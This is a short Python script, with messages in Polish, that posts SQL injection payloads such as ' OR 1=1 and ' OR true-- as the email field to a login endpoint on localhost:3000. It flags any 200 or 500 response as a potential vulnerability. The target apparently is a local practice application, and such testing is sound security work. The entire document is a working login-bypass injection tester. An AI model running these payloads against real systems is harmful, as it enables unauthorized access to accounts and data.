import requests

payloads=["email@gmail.com", "--", "'", "' OR 1=1", "' OR true--"]
url="http://localhost:3000/rest/user/login"

def sqli():
    for payload in payloads:
        dane={"email":payload, "password":"password"}
        req=requests.post(url=url, data=dane)
        if req.status_code==200 or req.status_code==500:
            print(f'znaleziona potencjalna podatnosc dla: {payload}')

if __name__=='__main__':        
    sqli()